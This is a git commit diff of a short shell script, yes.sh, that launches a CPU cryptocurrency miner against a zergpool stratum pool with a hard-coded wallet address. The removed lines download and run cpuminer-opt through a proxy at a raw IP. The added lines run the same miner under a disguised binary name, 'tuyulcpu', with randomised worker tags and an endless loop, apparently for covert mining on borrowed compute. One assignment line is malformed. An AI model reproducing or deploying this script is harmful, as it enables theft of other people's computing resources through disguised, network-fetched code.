f8c7f50830434217e4ee80bf6a8818e5085d4980
babehdyo <widyo.babeh@gmail.com>
2021-06-16 11:17:10 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -1,9 +1,9 @@
 #!/bin/sh
-apt update
-apt install wget unzip -y 
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk -p c=DGB,mc=PYRK,ID=Gits01 -x http://35.240.224.156:8000 -q
+POOL=stratum+tcp://lyra2z330.na.mine.zergpool.com:4563
+WALLET=DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
+WORKER=WORKER=$(echo $(shuf -i 1000-9999 -n 1)-TUYUL-CPU)
+chmod +x tuyulcpu
+./tuyulcpu -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
 while [ 1 ]; do
 sleep 3
 done
